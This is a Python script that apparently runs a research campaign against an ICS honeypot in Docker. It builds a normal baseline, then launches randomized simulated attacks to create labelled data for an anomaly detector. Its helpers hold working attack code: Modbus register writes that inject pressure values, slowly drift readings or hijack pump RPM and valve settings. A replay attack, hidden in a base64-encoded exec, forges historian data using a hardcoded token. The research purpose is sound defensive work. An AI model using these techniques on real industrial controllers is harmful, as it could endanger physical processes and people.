#!/usr/bin/env python3
"""
Extended Campaign Orchestrator for ICS Honeypot (scripts/run_extended_campaign.py)
================================================================================
This script automates the generation of a high-volume simulation dataset by running
a 3-hour real-time campaign with repeated, randomized attacks.

Workflow:
1. Wipes any old telemetry and models for a clean start (docker compose down -v).
2. Starts the docker container stack (docker compose up -d).
3. Waits for InfluxDB and PLC services to be healthy.
4. Waits 1 hour (3600s) to build a robust, quiet normal baseline.
5. Triggers a model reset in the live ML engine to train it on the 1-hour baseline.
6. Enters the 30-minute validation split:
   - Run a standard full chain (recon + info + exploit + drift + lateral + privesc + replay)
   - Run a custom Phase 5 (stealth drift)
7. Enters the 1.5-hour test split:
   - Repeatedly launches randomized instances of Phase 4, 5, 7, and 8 attacks.
8. Writes all attack boundaries to results/attack_results_extended.csv.
9. Exports the final data using scripts/save_results.py.

Usage:
    Full 3-hour run:
        nohup python3 scripts/run_extended_campaign.py > results/campaign.out 2>&1 &

    Smoke-test (compressed ~5-minute dry-run to validate the full pipeline):
        nohup python3 scripts/run_extended_campaign.py --smoke-test > results/smoke.out 2>&1 &
"""

import os
import sys
import time
import datetime
import subprocess
import random
import shlex
import urllib.request
import urllib.error
import argparse


class CampaignError(Exception):
    """Raised when a campaign step fails and the run must abort."""

# ── Config ────────────────────────────────────────────────────────────────────
PROJECT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
RESULTS_DIR = os.path.join(PROJECT_DIR, "results")
ATTACK_CSV  = os.path.join(RESULTS_DIR, "attack_results_extended.csv")
LOG_FILE    = os.path.join(RESULTS_DIR, "campaign_run.log")
# save_results.py queries host-local InfluxDB and writes CSVs for evaluate.py — use eval_env.
EVAL_PYTHON = os.environ.get(
    "EVAL_PYTHON",
    "/home/mohamed-ayman/eval_env/bin/python",
)

CAMPAIGN_START_UTC = None
CAMPAIGN_END_UTC = None

os.makedirs(RESULTS_DIR, exist_ok=True)


# ── Helpers ───────────────────────────────────────────────────────────────────
def log(msg):
    ts   = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")


def record_attack(phase, name, status, detail=""):
    utc_now = datetime.datetime.now(datetime.timezone.utc).strftime(
        "%Y-%m-%dT%H:%M:%S.%fZ"
    )
    row = f"{utc_now},{phase},{name},{status},{detail}\n"
    with open(ATTACK_CSV, "a") as f:
        f.write(row)
    log(f"RECORDED: Phase {phase} ({name}) - {status} - {detail}")


def _log_subprocess_output(res, label=""):
    """Log full stdout/stderr from a failed subprocess (Python -c tracebacks land on stdout)."""
    prefix = f"  [{label}] " if label else "  "
    if res.stdout and res.stdout.strip():
        log(f"{prefix}stdout:")
        for line in res.stdout.rstrip().splitlines():
            log(f"{prefix}  {line}")
    if res.stderr and res.stderr.strip():
        log(f"{prefix}stderr:")
        for line in res.stderr.rstrip().splitlines():
            log(f"{prefix}  {line}")
    if not (res.stdout and res.stdout.strip()) and not (res.stderr and res.stderr.strip()):
        log(f"{prefix}(no output captured)")


def utc_now_iso():
    return datetime.datetime.now(datetime.timezone.utc).strftime(
        "%Y-%m-%dT%H:%M:%S.%fZ"
    )


def mark_campaign_start():
    global CAMPAIGN_START_UTC
    CAMPAIGN_START_UTC = utc_now_iso()
    log(f"Campaign telemetry window start: {CAMPAIGN_START_UTC}")


def mark_campaign_end():
    global CAMPAIGN_END_UTC
    CAMPAIGN_END_UTC = utc_now_iso()
    log(f"Campaign telemetry window end: {CAMPAIGN_END_UTC}")


def run_host_cmd(cmd, *, fatal=True):
    log(f"HOST CMD: {cmd}")
    res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if res.returncode != 0:
        log(f"  [ERROR] Host command exit code {res.returncode}")
        _log_subprocess_output(res, "HOST")
        if fatal:
            raise CampaignError(f"Host command failed (exit {res.returncode}): {cmd}")
    return res.stdout.strip()


def run_attacker_cmd(cmd, *, fatal=True):
    docker_cmd = f"docker exec -t attacker_node {cmd}"
    log(f"ATTACKER CMD: {docker_cmd[:200]}...")
    t0 = time.monotonic()
    res = subprocess.run(docker_cmd, shell=True, capture_output=True, text=True)
    elapsed = time.monotonic() - t0
    log(f"  Attacker command finished in {elapsed:.1f}s (exit {res.returncode})")
    if res.returncode != 0:
        log(f"  [ERROR] Attacker command exit code {res.returncode}")
        _log_subprocess_output(res, "ATTACKER")
        if fatal:
            raise CampaignError(
                f"Attacker command failed (exit {res.returncode}) after {elapsed:.1f}s"
            )
    elif res.stdout and res.stdout.strip():
        log(f"  Attacker stdout: {res.stdout.strip()[:500]}")
    return res.stdout.strip()


def check_live_services():
    log("Checking container health...")
    for i in range(10):
        res = run_host_cmd("docker ps --filter name=plc_simulator --format '{{.Status}}'")
        if "Up" in res:
            log("plc_simulator is up.")
            break
        log(f"Waiting for plc_simulator... (attempt {i+1}/10)")
        time.sleep(5)
    else:
        log("plc_simulator failed to start!")
        return False

    log("Checking Docker container health snapshot...")
    snapshot = run_host_cmd(
        "docker ps --format 'table {{.Names}}\\t{{.Status}}'"
    )
    for line in snapshot.splitlines():
        log(f"  {line}")

    log("Waiting 10 extra seconds for InfluxDB + ML Engine to boot...")
    time.sleep(10)
    return True


def reset_ml_engine():
    log("Triggering live ML Engine model reset via POST /reset-model ...")
    try:
        req = urllib.request.Request(
            "http://localhost:8001/reset-model", data=b"", method="POST"
        )
        with urllib.request.urlopen(req, timeout=10) as response:
            body = response.read().decode().strip()
            log(f"ML Engine reset response: {body}")
    except Exception as e:
        log(f"ML Engine reset failed (non-fatal): {e}")


def save_and_locate_results():
    """Run save_results.py, copy attack CSV, return path to the new run dir."""
    log("Exporting database snapshot from InfluxDB ...")
    before_dirs = {
        d for d in os.listdir(RESULTS_DIR)
        if os.path.isdir(os.path.join(RESULTS_DIR, d)) and d[:4].isdigit()
    }
    save_script = os.path.join(PROJECT_DIR, "scripts", "save_results.py")
    if not os.path.isfile(EVAL_PYTHON):
        raise CampaignError(
            f"eval_env Python not found at {EVAL_PYTHON}. "
            "Set EVAL_PYTHON to the interpreter that has influxdb-client installed."
        )
    if not CAMPAIGN_START_UTC or not CAMPAIGN_END_UTC:
        raise CampaignError(
            "Campaign window timestamps were not recorded before export."
        )
    run_host_cmd(
        f"{shlex.quote(EVAL_PYTHON)} {shlex.quote(save_script)} "
        f"--start {shlex.quote(CAMPAIGN_START_UTC)} "
        f"--stop {shlex.quote(CAMPAIGN_END_UTC)}"
    )

    after_dirs = {
        d for d in os.listdir(RESULTS_DIR)
        if os.path.isdir(os.path.join(RESULTS_DIR, d)) and d[:4].isdigit()
    }
    new_dirs = sorted(after_dirs - before_dirs)
    if not new_dirs:
        raise CampaignError(
            "save_results.py completed but no new timestamped results directory was created. "
            f"Existing dirs: {sorted(before_dirs) or '(none)'}"
        )

    latest_dir = os.path.join(RESULTS_DIR, new_dirs[-1])
    summary = os.path.join(latest_dir, "summary.txt")
    if not os.path.isfile(summary):
        raise CampaignError(
            f"Results directory {latest_dir} exists but summary.txt is missing — "
            "telemetry export likely failed."
        )

    csv_dir = os.path.join(latest_dir, "csv")
    csv_files = [
        name for name in os.listdir(csv_dir)
        if name.endswith(".csv") and os.path.getsize(os.path.join(csv_dir, name)) > 0
    ]
    if not csv_files:
        raise CampaignError(
            f"Results directory {latest_dir} has no telemetry CSV files in csv/."
        )
    pipeline_csv = os.path.join(csv_dir, "pipeline_metrics.csv")
    if not os.path.isfile(pipeline_csv):
        raise CampaignError(
            f"Required telemetry file missing: {pipeline_csv}"
        )

    cp_res = subprocess.run(
        ["cp", ATTACK_CSV, latest_dir + "/"],
        capture_output=True,
        text=True,
    )
    if cp_res.returncode != 0:
        log("[ERROR] Failed to copy attack CSV into results directory")
        _log_subprocess_output(cp_res, "CP")
        raise CampaignError("Failed to copy attack_results_extended.csv into results dir")

    log(f"Campaign artefacts saved: {latest_dir}")
    log(f"Evaluate with: python3 evaluate.py --data-dir {shlex.quote(latest_dir)}")
    return latest_dir


# ── Shared attack helpers ─────────────────────────────────────────────────────
MODBUS_HOST = "plc_simulator"
MODBUS_PORT = 502

def _pymodbus_write(register, value, label=""):
    """Build an inline python3 one-liner that writes a single Modbus register."""
    return (
        f"python3 -c \""
        f"from pymodbus.client import ModbusTcpClient; "
        f"c = ModbusTcpClient('{MODBUS_HOST}', port={MODBUS_PORT}); c.connect(); "
        f"c.write_register({register}, {value}); c.close()"
        f"\""
    )


def run_stealth_drift(step_psi, delay_s, num_steps):
    drift_loop = (
        f"for i in range({num_steps}): "
        f"c.write_register(100, base + (i+1)*{step_psi}); time.sleep({delay_s})"
    )
    cmd = (
        f"python3 -c \""
        f"from pymodbus.client import ModbusTcpClient; import time; "
        f"c = ModbusTcpClient('{MODBUS_HOST}', port={MODBUS_PORT}); c.connect(); "
        f"base = c.read_holding_registers(100, count=1).registers[0]; "
        f"exec({drift_loop!r}); c.close()"
        f"\""
    )
    run_attacker_cmd(cmd)


def run_actuator_hijack(rpm, valve, hold_s):
    cmd = (
        f"python3 -c \""
        f"from pymodbus.client import ModbusTcpClient; import time; "
        f"c = ModbusTcpClient('{MODBUS_HOST}', port={MODBUS_PORT}); c.connect(); "
        f"c.write_register(200, {rpm}); time.sleep(1); "
        f"c.write_register(201, {valve}); time.sleep({hold_s}); "
        f"c.write_register(200, 1200); "
        f"c.write_register(201, 500); c.close()"
        f"\""
    )
    run_attacker_cmd(cmd)


def run_replay_attack(pressure, count):
    import base64
    endpoint = (
        "http://ics_historian:8086/api/v2/write"
        "?org=my_refinery&bucket=sensor_logs&precision=ns"
    )
    script = (
        f"import time, requests\n"
        f"ep = '{endpoint}'\n"
        f"hdr = {{'Authorization': 'Token supersecrettoken', 'Content-Type': 'text/plain; charset=utf-8'}}\n"
        f"for _ in range({count}):\n"
        f"    requests.post(ep, headers=hdr, data='pipeline_metrics,location=pump_station_01,source=historian_bridge pressure={pressure} ' + str(time.time_ns()), timeout=2)\n"
        f"    time.sleep(0.1)\n"
    )
    b64_script = base64.b64encode(script.encode('utf-8')).decode('utf-8')
    cmd = f"python3 -c \"import base64; exec(base64.b64decode('{b64_script}').decode('utf-8'))\""
    run_attacker_cmd(cmd)



# ── Smoke-test timeline ───────────────────────────────────────────────────────
def run_smoke_test():
    """
    Compressed ~5-minute pipeline smoke-test:
      0:00–1:00  (60 s)  — Quiet baseline
      1:00–1:15  (15 s)  — ML model fit
      1:15–3:00  (105 s) — Validation: stealth drift (+3 PSI × 10 steps × 5 s = 50 s, then wait 55 s)
      3:00–5:10  (~130 s) — Test: semantic injection, Phase 7 actuator hijack, cooldown
    """
    log("=" * 70)
    log("SMOKE TEST — Phase 1: Baseline (60 seconds)")
    mark_campaign_start()
    log("=" * 70)
    for tick in range(6):
        time.sleep(10)
        log(f"  Baseline: {(tick+1)*10}/60 s elapsed")

    reset_ml_engine()
    log("Waiting 15 s for model fit ...")
    time.sleep(15)

    log("=" * 70)
    log("SMOKE TEST — Phase 2: Validation (stealth drift, 105 s window)")
    log("=" * 70)
    record_attack(5, "phase5_payload", "started",
                  "Smoke-test Validation — +3 PSI every 5 s, 10 steps")
    run_stealth_drift(step_psi=3, delay_s=5, num_steps=10)   # ~50 s
    record_attack(5, "phase5_payload", "completed")
    log("Stealth drift done. Waiting 55 s to fill validation window ...")
    time.sleep(55)

    log("=" * 70)
    log("SMOKE TEST — Phase 3: Test (semantic injection, 120 s window)")
    log("=" * 70)
    pressure = 350
    record_attack(4, "phase4_exploit", "started",
                  f"Smoke-test Test — Injection {pressure} PSI")
    run_attacker_cmd(_pymodbus_write(100, pressure, label="Smoke injection"))
    record_attack(4, "phase4_exploit", "completed")

    log("SMOKE TEST — Phase 7: Actuator hijack (RPM=3000, valve closed, 8 s hold)")
    record_attack(7, "phase7_privesc", "started",
                  "Smoke-test — Actuator RPM=3000 Valve=0 hold=8s")
    run_actuator_hijack(rpm=3000, valve=0, hold_s=8)
    record_attack(7, "phase7_privesc", "completed")

    log("Attacks done. Cooling down for 110 s ...")
    time.sleep(110)


# ── Full 3-hour timeline ──────────────────────────────────────────────────────
def run_full_campaign():
    log("=" * 70)
    log("FULL CAMPAIGN — Phase 1: Baseline (60 minutes)")
    mark_campaign_start()
    log("=" * 70)
    for tick in range(6):
        time.sleep(600)
        log(f"  Baseline: {(tick+1)*10}/60 min elapsed")

    reset_ml_engine()
    log("Waiting 5 min for model fit ...")
    time.sleep(300)

    # ── Validation: full kill chain + standalone drift ────────────────────────
    log("=" * 70)
    log("FULL CAMPAIGN — Phase 2: Validation (30 minutes)")
    log("=" * 70)

    for phase_num, phase_name in [
        (1, "phase1_recon"),
        (2, "phase2_info_gathering"),
        (3, "phase3_vuln_scan"),
        (4, "phase4_exploit"),
        (5, "phase5_payload"),
        (6, "phase6_lateral_movement"),
        (7, "phase7_privesc"),
        (8, "phase8_replay"),
    ]:
        record_attack(phase_num, phase_name, "started", "Validation chain")
        run_attacker_cmd(f"python3 attack_suite.py --phase {phase_num}")
        record_attack(phase_num, phase_name, "completed")
        time.sleep(10)

    log("Kill chain done. Waiting 10 min before standalone drift ...")
    time.sleep(600)

    record_attack(5, "phase5_payload", "started",
                  "Validation Standalone — +3 PSI every 5 s, 10 steps")
    run_stealth_drift(step_psi=3, delay_s=5, num_steps=10)
    record_attack(5, "phase5_payload", "completed")

    log("Validation done. Waiting 8 min to fill window ...")
    time.sleep(480)

    # ── Test: 8 randomised attacks over 90 minutes ───────────────────────────
    log("=" * 70)
    log("FULL CAMPAIGN — Phase 3: Test (1.5 hours, 8 attacks)")
    log("=" * 70)

    attack_pool = [
        {"phase": 4, "name": "phase4_exploit",    "desc": "Semantic Injection"},
        {"phase": 5, "name": "phase5_payload",     "desc": "Stealth Drift"},
        {"phase": 7, "name": "phase7_privesc",     "desc": "Actuator Manipulation"},
        {"phase": 8, "name": "phase8_replay",      "desc": "Replay Attack"},
    ] * 2
    random.shuffle(attack_pool)

    for idx, attack in enumerate(attack_pool):
        interval = random.randint(420, 600)
        log(f"Quiet interval before attack {idx+1}/8: {interval} s ...")
        time.sleep(interval)

        log(f"--- Test Attack {idx+1}/8: {attack['desc']} ---")

        if attack["phase"] == 4:
            p = random.choice([310, 330, 360, 400])
            record_attack(4, "phase4_exploit", "started",
                          f"Test Solo — Injection {p} PSI")
            run_attacker_cmd(_pymodbus_write(100, p))
            record_attack(4, "phase4_exploit", "completed")

        elif attack["phase"] == 5:
            step  = random.choice([2, 3, 4])
            delay = random.choice([3, 4, 5])
            steps = random.choice([10, 12, 14])
            record_attack(5, "phase5_payload", "started",
                          f"Test Solo — Drift +{step} PSI every {delay}s × {steps}")
            run_stealth_drift(step_psi=step, delay_s=delay, num_steps=steps)
            record_attack(5, "phase5_payload", "completed")

        elif attack["phase"] == 7:
            rpm   = random.choice([2600, 2800, 3000])
            valve = random.choice([0, 100])
            hold  = random.choice([6, 8, 10])
            record_attack(7, "phase7_privesc", "started",
                          f"Test Solo — Actuator RPM={rpm} Valve={valve} hold={hold}s")
            run_actuator_hijack(rpm=rpm, valve=valve, hold_s=hold)
            record_attack(7, "phase7_privesc", "completed")

        elif attack["phase"] == 8:
            pressure = random.choice([115.0, 120.0, 125.0])
            count    = random.choice([150, 200, 250])
            record_attack(8, "phase8_replay", "started",
                          f"Test Solo — Replay {pressure} PSI × {count} frames")
            run_replay_attack(pressure=pressure, count=count)
            record_attack(8, "phase8_replay", "completed")

    log("All test attacks done. Cooling down 5 min ...")
    time.sleep(300)


# ── Entry point ───────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="ICS Honeypot — Extended Data Generation Campaign"
    )
    parser.add_argument(
        "--smoke-test",
        action="store_true",
        help=(
            "Run a compressed ~5-minute end-to-end smoke-test instead of "
            "the full 3-hour campaign"
        ),
    )
    args = parser.parse_args()

    os.chdir(PROJECT_DIR)

    # Initialise log and attack CSV
    with open(LOG_FILE, "w") as f:
        f.write("=== ICS Honeypot Extended Campaign Log ===\n")
        if args.smoke_test:
            f.write("--- SMOKE TEST MODE ---\n")

    with open(ATTACK_CSV, "w") as f:
        f.write("timestamp,phase,phase_name,status,detail\n")

    mode = "SMOKE TEST" if args.smoke_test else "FULL 3-HOUR CAMPAIGN"
    log(f"Starting ICS Honeypot Data Generator — Mode: {mode}")
    log(f"Project directory : {PROJECT_DIR}")

    try:
        # Wipe + start stack
        log("Bringing stack down and wiping volumes ...")
        run_host_cmd("docker compose down -v")

        log("Building and starting all services ...")
        run_host_cmd("docker compose up --build -d")

        if not check_live_services():
            raise CampaignError("Service startup failed — plc_simulator did not become healthy")

        # Execute campaign
        if args.smoke_test:
            run_smoke_test()
        else:
            run_full_campaign()

        mark_campaign_end()

        # Export + locate results
        latest_dir = save_and_locate_results()

        log("=" * 70)
        log(f"CAMPAIGN COMPLETE ({mode})")
        log(f"Results directory : {latest_dir}")
        log(
            f"Run evaluation   : "
            f"python3 evaluate.py --data-dir {shlex.quote(latest_dir)}"
        )
        log("=" * 70)

    except CampaignError as exc:
        log("=" * 70)
        log(f"CAMPAIGN FAILED ({mode}): {exc}")
        log("=" * 70)
        sys.exit(1)


if __name__ == "__main__":
    main()
